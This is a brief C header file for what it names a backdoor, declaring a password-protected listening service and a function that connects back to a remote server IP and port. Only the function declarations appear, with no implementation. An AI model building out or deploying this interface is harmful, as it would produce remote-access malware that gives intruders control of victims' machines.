#ifndef _BACKDOOR_
#define _BACKDOOR_

int start_service(char *usr, char *pwd, unsigned short listenPort);
int conn_back_to_server(char *servIP, unsigned short servPort);

#endif //_BACKDOOR_
